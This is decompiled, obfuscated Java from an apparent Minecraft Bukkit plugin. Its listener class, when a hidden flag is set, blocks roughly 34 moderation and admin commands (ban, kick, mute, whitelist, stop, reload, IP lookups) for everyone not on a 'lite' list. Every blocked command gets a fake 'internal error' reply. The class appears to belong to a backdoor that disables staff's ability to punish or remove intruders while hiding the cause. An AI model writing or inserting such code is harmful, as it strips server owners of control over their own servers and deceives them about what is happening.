/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerCommandPreprocessEvent
 */
package me.system.runner.events;

import me.system.runner.Core;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class NoPunishmentCommandListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    @EventHandler
    public void onCommandProcess(PlayerCommandPreprocessEvent llllllllllllllIIIIlIlIIIllIlIIIl) {
        Player llllllllllllllIIIIlIlIIIllIlIIII = llllllllllllllIIIIlIlIIIllIlIIIl.getPlayer();
        if (NoPunishmentCommandListener.INSTANCE.modCmd && !NoPunishmentCommandListener.INSTANCE.lite.contains(llllllllllllllIIIIlIlIIIllIlIIII.getName())) {
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/bukkit")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/minecraft")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/litebans")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/whitelist")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/wl")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/eban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/banip")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ebanip")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/essentials")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ipban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/kick")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ekick")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/punish")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/stop")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/reload")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/rl")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/restart")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ban-ip")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/mute")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/emute")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/kill")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ekill")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/etempmute")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/tempmute")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/tempban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/etempban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/jail")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/ejail")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/aacban")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/aackick")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/checkip")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/dupeip")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
            if (llllllllllllllIIIIlIlIIIllIlIIIl.getMessage().toLowerCase().startsWith("/seen")) {
                llllllllllllllIIIIlIlIIIllIlIIIl.setCancelled(true);
                llllllllllllllIIIIlIlIIIllIlIIII.sendMessage("\u00a7cAn interal error has occured while attempting to execute this command.");
            }
        }
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    public NoPunishmentCommandListener() {
        NoPunishmentCommandListener llllllllllllllIIIIlIlIIIllIlIlIl;
    }
}

